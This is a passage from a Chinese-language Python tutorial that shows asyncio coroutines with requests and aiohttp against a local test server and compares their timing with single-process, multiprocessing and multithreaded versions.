time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Cost time: <span class="number">15.040287971496582</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过协程的方式请求页面发现还是在依次执行，时间为15s，效率并没有提高，原因是：协程提高效率的最大 特点是异步协程，重点是要能够异步请求，就需要程序可以将阻塞的协程挂起，让出控制权，执行其他协程。在python3.5及以后通过await实现挂起的操作，当loop循环事件遇到await是就执行协程挂起。</p>
</li>
<li><p>根据第三点的提出的特点，我们要实现挂起的是请求页面的操作，所以这里将请求页面的方法做一个修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = <span class="keyword">await</span> requests.get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Cost time: <span class="number">15.033875942230225</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"D:/python/实战项目/Coroutine8.py"</span>, line <span class="number">10</span>, <span class="keyword">in</span> Request</span><br><span class="line">    response = <span class="keyword">await</span> requests.get(url)</span><br><span class="line">TypeError: object Response can<span class="string">'t be used in '</span><span class="keyword">await</span><span class="string">' expression</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过运行结果来看，不能这样修改，Waiting for http这里确实是挂起了，但是await后面的对象不对，因为await后面必须跟一个原生 coroutine 对象或者一个由 types.coroutine() 修饰的生成器，这个生成器可以返回 coroutine 对象，而requests.get的生成的对象是：<class 'requests.models.response'>，所以不符合</class></p>
</li>
<li><p>所以考虑将请求页面的方法单独封装，实现生成coroutine 对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(url)</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = <span class="keyword">await</span> get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Cost time: <span class="number">15.035670042037964</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过运行结果来看，将I/O操作的代码封装到 async 修饰的方法里面是不可行，无法实现异步请求，所以必须使用支持异步请求的方法来实现，这里使用<strong>aiohttp</strong>(时间缩短为原来的1/5，效率大大提高)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#不要为每次的连接都创建一次session,一般情况下只需要创建一个session，然后使用这个session执行所有的请求。</span></span><br><span class="line"><span class="comment">#每个session对象，内部包含了一个连接池，并且将会保持连接和连接复用（默认开启）可以加快整体的性能。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">       session = aiohttp.ClientSession()</span><br><span class="line">       response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">       result = <span class="keyword">await</span> response.text()</span><br><span class="line">       <span class="keyword">await</span> session.close()           </span><br><span class="line">       <span class="comment">#这里的await是必须的，因为session的请求会话出现了可挂起的选项，如果close不可以挂起，会出现阻塞的状态导致报错</span></span><br><span class="line">       <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">   <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">       url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">       print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">       result = <span class="keyword">await</span> get(url)</span><br><span class="line">       print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"></span><br><span class="line">   tasks = [asyncio.ensure_future(request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">   loop = asyncio.get_event_loop()</span><br><span class="line">   loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line">   end = time.time()</span><br><span class="line">   print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">3.0310966968536377</span></span><br><span class="line"><span class="comment"># 修改await session.close()为session.close()的报错执行结果</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">3.012549638748169</span></span><br><span class="line">   D:/python/Conoutine10.py:<span class="number">12</span>: RuntimeWarning: coroutine <span class="string">'ClientSession.close'</span> was never        session.close()</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9D68</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9EF0</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F28</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F98</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F60</span>&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过几次代码的修改，我们成功的实现了真正的异步协程。开始运行时，时间循环会运行第一个 task，针对第一个 task 来说，当执行到第一个 await 跟着的 get() 方法时，它被挂起，但这个 get() 方法第一步的执行是非阻塞的，挂起之后立马被唤醒，所以立即又进入执行，创建了 ClientSession 对象，接着遇到了第二个 await，调用了 session.get() 请求方法，然后就被挂起了，由于请求需要耗时很久，所以一直没有被唤醒，好第一个 task 被挂起了，那接下来该怎么办呢？事件循环会寻找当前未被挂起的协程继续执行，于是就转而执行第二个 task 了，也是一样的流程操作，直到执行了第五个 task 的 session.get() 方法之后，全部的 task 都被挂起了。所有 task 都已经处于挂起状态，那咋办？只好等待了。3 秒之后，几个请求几乎同时都有了响应，然后几个 task 也被唤醒接着执行，输出请求结果，最后耗时，3 秒！这里对应这我们模拟服务端设置的延时3秒。</p>
</li>
<li><p>根据上面显示的结果来看，5个task在3s之内都是挂起的等待的，同理，在3s之内CPU处理的task数量肯定会比5个（取决于CPU，我这里改成1000就会报错）；所以就意味着在CPU允许的范围之内处理多少task的时间都是3s（前提是服务段抗压性好，能正确对每次请求做出正确的返回）。将5改为300来测试：task数量提高了60倍，处理时间还是3s，可以看到协程的优点；多出来的部分时间是IO 传输时延</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    session = aiohttp.ClientSession()</span><br><span class="line">    response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">    result = <span class="keyword">await</span> response.text()</span><br><span class="line">    <span class="keyword">await</span>  session.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = <span class="keyword">await</span> get(url)</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasks = [asyncio.ensure_future(request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">300</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="与单进程、多进程、多线程的对比"><a href="#与单进程、多进程、多线程的对比" class="headerlink" title="与单进程、多进程、多线程的对比"></a>与单进程、多进程、多线程的对比</h3><ol>
<li><p>单进程，单线程：(以10次请求为例)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">	url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = requests.get(url).text</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    Request()</span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">30.057233095169067</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>多进程(以10次请求为例)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   <span class="keyword">import</span> time</span><br><span class="line">   <span class="keyword">import</span> multiprocessing</span><br><span class="line"> </span><br><span class="line">   start = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">(_)</span>:</span></span><br><span class="line">       url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">       print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">       result = requests.get(url).text</span><br><span class="line">       print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">       cpu_count = multiprocessing.cpu_count()    <span class="comment">#cpu数目</span></span><br><span class="line">       print(<span class="string">'Cpu count:'</span>,cpu_count)</span><br><span class="line">       pool = multiprocessing.Pool(cpu_count)</span><br><span class="line">       pool.map(Request,range(<span class="number">10</span>))</span><br><span class="line">       end = time.time()</span><br><span class="line">       print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line">   <span class="comment">#运行结果：</span></span><br><span class="line">   Cpu count: <span class="number">4</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">10.076906442642212</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>多线程(以10次请求为例)：由于无法进行异步及GIL的存在，效率很低，上下文的切换导致开销，甚至时间比单线程更长一点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = requests.get(url).text</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target = Request())</span><br><span class="line">    t.start()</span><br><span class="line">    t.join()</span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">30.073291301727295</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
